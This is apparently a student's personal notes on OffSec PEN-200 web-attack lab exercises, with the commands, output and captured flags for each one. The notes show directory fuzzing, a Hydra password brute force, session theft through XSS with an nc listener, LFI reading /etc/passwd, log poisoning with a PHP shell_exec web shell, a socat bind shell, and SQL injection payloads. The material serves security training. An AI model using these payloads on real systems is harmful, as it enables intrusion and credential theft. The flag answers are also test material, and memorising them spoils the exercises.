---
id: offsec labs
tags: [offsec, labs]
created: 2023-01-27
---
# offsec labs

backlinks: [[snippets-bash]]

sources:

---

## PEN-200: 8.2.5 Nessus Vulnerablity Scanning Unauthenticated scan

 Exercises

1. This website running on the target VM #1 is dedicated to all things maps! Follow the maps to get the flag.

```shell
──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ export IP=192.168.162.52                             
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ curl http://$IP/robots.txt                                                                                 
<pre>
# Group 1
User-agent: Googlebot
Disallow: /

# Group 2
User-agent: PWKStudents
Disallow: /flagF1FE4DEFCB.html

</pre>                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ curl http://$IP/sitemap.xml
<?xml version="1.0" encoding="UTF-8"?>

<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">

  <url>

     <loc>/index.html</loc>

     <lastmod>2020-02-29</lastmod>

     <changefreq>monthly</changefreq>

     <priority>0.4</priority>

  </url>

  <url>

     <loc>/robots.txt</loc>

     <lastmod>2020-02-29</lastmod>

     <changefreq>monthly</changefreq>

     <priority>0.3</priority>

  </url>

  <url>

    <loc>/flagEE94C84BE6EC.html</loc>

    <lastmod>2020-02-29</lastmod>

    <changefreq>weekly</changefreq>

    <priority>0.8</priority>

  </url>

</urlset>                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ curl http://$IP/flagEE94C84BE6EC.html            
<html>
        <p>
        The flag part 2 is:<br>
        <code>4e482fe28da6791e7}</b><br><br>

        </p>
</html>                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ curl http://$IP/flagF1FE4DEFCB.html  
<html>
        <p>
        The flag part 1 is:<br>
        <code>OS{cf73bd3d040b451</code><br><br>
        Look for an important <i>map</i> to find the second part.
        </p>
</html>         

```

2. Inspect the target VM #2 web application URL and notice if anything is interesting at the URL level.

```shell
flag is url encoded and 

┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ export IP=192.168.162.52           
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ curl http://$IP                    
<meta http-equiv="refresh" content="0; URL=/?flag=%4f%53%7b%39%34%65%31%62%38%61%32%38%39%32%31%65%38%33%62%31%35%34%62%32%61%31%62%38%66%33%33%32%30%36%38%7d" />                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/9]
└─$ curl http://$IP/?flag=%4f%53%7b%39%34%65%31%62%38%61%32%38%39%32%31%65%38%33%62%31%35%34%62%32%61%31%62%38%66%33%33%32%30%36%38%7d
<!doctype html>
<link rel="stylesheet" type="text/css" href="style.css">
<html>
    <head>
        <title>Uninteresting Site</title>
    </head>
    <body>
        <h1>Welcome to my New Webpage</h1>
        <div class="center">
          <p>
            Isn't this site so interesting?
          </p>
        </div>
    </body>
</html>    


http://192.168.162.52/?flag=%4f%53%7b%39%34%65%31%62%38%61%32%38%39%32%31%65%38%33%62%31%35%34%62%32%61%31%62%38%66%33%33%32%30%36%38%7d

http://192.168.162.52/?flag=OS{94e1b8a28921e83b154b2a1b8f332068}

```

1. We made another website but something is wrong. The site is available at target VM #3, but it keeps giving some weird, non-standard responses.

```shell
Response header contains a non standard x something field

X-Something-Non-Standard
	VGhlIGZsYWcgaXM6IE9TezFkZDdiNjE3MWJmMWFiNzJhMDg2MTMxNmI3NjZlN2YwfQ==

is base64 encoded

The flag is: OS{1dd7b6171bf1ab72a0861316b766e7f0}

```

4. We made this cool website dedicated to the three web amigos, HTML, CSS, and JavaScript. It is available at the web root on the target VM #4. Take a closer look at each of the three friends to get flag for this challenge.

```
html 
    <!--
      Here is part 1 of 3 of your flag:

      OS{0727f9e73
      
      Looking at the source code is a good way to get started on a web challenge.
      Look at the source of the other parts of this website to find the remaining two parts.
      Based on initial West Point (USMA) Cyber Team problem by Roy Ragsdale (phlint)
    -->

jumbotron.css 
/*  Here is part 2 of 3 of your flag:
 *
 *  0f2e1f13c31c
 *
 *  Continue to look around at the other parts of this website to find the remaining flags.
 *  Based on initial West Point (USMA) Cyber Team problem by Roy Ragsdale (phlint)
 */



displayflag_8304 javascript function in color_flash.js

Here is part 3 of 3 of your flag:
915c606d544}




OS{0727f9e730f2e1f13c31c915c606d544}
```


## PEN-200: 9.3.4 Web application assessment tools


Exercises

Spend some time reviewing the applications available under the Web Application Analysis menu in Kali Linux.

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

2. We have a lot of mess on our hands, and the new DIRTBUSTER cleaning service is just what we need to help with the cleanup! You can visit their new site on the target VM #1, but it is still under development. We wonder where they hid their admin portal.

```

┌──(kali㉿kali)-[~]

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.162.52/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3360ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4363ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4366ms]
                        [Status: 200, Size: 439, Words: 113, Lines: 17, Duration: 5389ms]
index.html              [Status: 200, Size: 439, Words: 113, Lines: 17, Duration: 240ms]
portal                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 238ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 242ms]
:: Progress: [4614/4614] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:34] :: Errors: 0 ::

admin:admin
OS{c69f8c2d17529b0ed1002ae56f6f9869}


```

3. The DIRTBUSTER team finally changed their default credentials, but they are not very original. We complied at http://target_vm/passwords.txt of potential passwords from the DIRTBUSTER employee contact info - I am confident the password is in there somewhere. The username is still admin, and the new login portal is available at the web server root folder on the target VM #2.

```shell


└─$ sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^&debug=0:Login Failed" -v
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-08 19:35:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:1/p:30), ~2 tries per task
[DATA] attacking http-post-form://192.168.162.52:80/login.php:username=admin&password=^PASS^&debug=0:Login Failed
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-post-form] host: 192.168.162.52   login: admin   password: zeddemore
[STATUS] attack finished for 192.168.162.52 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-08 19:35:56


Logged in!

Your flag is: OS{62abf67d40cdf5c12698009e1775f043}


```
## PEN-200: 9.5.2 Exploiting Admin Consoles

 Exercises

(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)

    Use Burp Intruder to gain access to the phpMyAdmin site running on your Windows 10 lab machine.

    Insert a new user into the "users" table.

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

    This time, we found this suite website with an admin portal running on port 80 of the target VM #1. It seems to be running a new and improved version of phpMyAdmin called phptapMyAdmin. We also found this short list of possible passwords, that it available at http://target_vm/rockyou_50.txt and that looks surprisingly similar to the first 50 clean passwords from rockyou.txt. Try to see if you can log in to this site.

```shell

Intercept -> repeater -> intruder -> username=root, password is rockyou_50.txt 

root:butterfly
OS{521e70f383f4c69cde81cfd39117c679}




```
## PEN-200: 9.6.6 Cross Site Scripting


 Exercises

(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)

    Exploit the XSS vulnerability in the sample application to get the admin cookie and hijack the session. Remember to use the PowerShell script on your Windows 10 lab machine to simulate the admin login.
    Consider what other ways an XSS vulnerability in this application might be used for attacks.
    Does this exploit attack the server or clients of the site?

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

You identified a page on the web root on the target VM #1 that had an XSS vulnerability. You set up a listener and received the below response similar to Listing 14 in Section 9.6.4. Use this response to log in to the site.

```shell
kali@kali:~$ 
sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 53824
GET /cool.jpg?output=PHPSESSID=c32b4d0057f039750b827e479ed8b06c HTTP/1.1
Referer: http://{{server}}:{{port}}/admin.php
Host: 10.11.0.22\nConnection: Keep-Alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```
```shell
Open cookie editor and replace the PHPSESSID with the above value

Access Granted!

Your flag is: OS{df9d88c73307f0b9cb5c10787d7675a7}



```

## PEN-200: 9.7.2 Directory traversal vulnerablities



 Exercises

(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)

    Obtain code execution through the use of the LFI attack.
    Use the code execution to obtain a full shell.

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

On target VM #1 you identified a page that has a new vulnerability. Can you use this vulnerability to determine the users of this system and then leak some sensitive information (flag.txt) from the home directory of one of these users?.

```shell


http://192.168.150.52/menu.php?file=/etc/passwd

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
jessie:x:1000:1000::    /home/jtx2:/bin/sh
victor:x:1001:1001::    /home/vgl2:/bin/sh
antonio:x:1002:1002::   /home/amm7:/bin/sh
stephanie:x:1003:1003:: /home/szd2:/bin/sh


# need to look at their home directory and not their usernames
http://192.168.150.52/menu.php?file=/home/szd2/flag.txt

OS{4165e5b38be054c8147ede2024fefa5e} 


```

This updated Taco Truck menu page suffers from the same File Inclusion vulnerability as the first menu website, but you no longer can use other files (like /etc/passwd) to determine the flag's file name. Instead, on VM #2 find and pollute the log file for this system to gain a web-based shell. Use that web shell to then list the files in the main web directory to both identify and read the flag.

```
└─$ nc -nv $IP 80                                              
(UNKNOWN) [192.168.150.52] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
HTTP/1.1 400 Bad Request
Date: Sun, 12 Feb 2023 03:25:57 GMT
Server: Apache/2.4.51 (Debian)
Content-Length: 302
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.51 (Debian) Server at 172.18.0.2 Port 80</address>
</body></html>

linux system, lets try the apache log location

/var/log/apache2/access.log

http://192.168.150.52/menu.php?file=/var/log/apache2/access.log

Warning
: Undefined array key "cmd" in
/var/log/apache2/access.log
on line
6


Fatal error
: Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty in /var/log/apache2/access.log:6 Stack trace: #0 /var/log/apache2/access.log(6): shell_exec('') #1 /var/www/html/menu.php(59): include('/var/log/apache...') #2 {main} thrown in
/var/log/apache2/access.log
on line
6

http://192.168.150.52/menu.php?file=/var/log/apache2/access.log&cmd=ls
admin.php
css
current_menu.php
database.php
favicon.ico
feedback.php
flag_sLR6vacoBYhQdhoPmF3zG1YS
img
index.php
menu.php
robots.txt
submitFeedback.php


http://192.168.150.52/menu.php?file=/var/log/apache2/access.log&cmd=cat%20flag_sLR6vacoBYhQdhoPmF3zG1YS
OS{125c9c5d8dfdd2e8610c8357117499b9}





```

As the third and final step, you now need to get a full shell on the target VM #3 and, not just any full shell, but a fully interactive TTY shell on the new and improved Taco Trunk website. To make your life easier, this website already has a web shell at /cmd.php (no need to repeat what you have already done with polluting the logs, but you can if you really want!). This challenge exposes the internal port 60000 (nothing is listening yet on this port) to enable the use of a bind shell instead of a reverse shell callback. Once you have a fully interactive tty shell, execute flag from inside this shell to get the flag to this challenge. NOTE: The Python interpreter available on the box is named python2.7.

```




#Works
socat TCP-LISTEN:60000,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

socat FILE:`tty`,raw,echo=0 TCP:$IP:60000

──(kali㉿kali)-[~]
└─$ socat FILE:`tty`,raw,echo=0 TCP:$IP:60000
/bin/sh: 0: can't access tty; job control turned off
$ wh^H^H
/bin/sh: 1: : not found
$ ls
admin.php    css               favicon.ico   img        robots.txt
cmd.php      current_menu.php  feedback.php  index.php  submitFeedback.php
cmd.php.txt  database.php      flag.txt      menu.php
$ cd ../
$ ls
flag  html
$ flag
/bin/sh: 5: flag: not found
$ ./flag
Please enter the character 's'.
s
You entered s
Great job. Here is your flag: 
OS{88dcd9c05f35da298fdc91fe8dab8798}
Press any key to continue...




```

## PEN-200: 9.9.4 SQL Injection authentication bypass

 Exercises

(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)

1. Interact with the MariaDB database and manually execute the commands required to authenticate to the application. Understand the vulnerability.
2. SQL inject the username field to bypass the login process.
3. Why is the username displayed like it is in the web application once the authentication process is bypassed?
4. Execute the SQL injection in the password field. Is the "LIMIT 1" necessary in the payload? Why or why not?

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

5. You identified a page on the target VM #1 that had a SQL injection vulnerability. Exploit that page to gain access to this site.

```
username:   ' or 1=1;#




Welcome ' or 1=1;#

Great Job!

Your flag is: OS{82b6675f104e948c0e7da7524f9cc6c5}





```

1. This time, utilize debug.php on the target VM #2 web server root, to leak the values of the table users from this database. This table has five columns: id, username, password, flag. and time. The backend database on this server is SQLite3, not MariaDB. The overall functionality/methodology for exploiting is the same, but some of the database dependent commands (like user() and @@version) will not work.

```
http://192.168.156.52/debug.php?id=1


http://192.168.156.52/debug.php?id=1%20UNION%20select 1,2,id,password,5from users


1 	  p@ssw0rd
2	    footworklure
3	    OS{f71f816fecd54b6125f22f348a8ad7f2}
Jake	Great tacos today!


```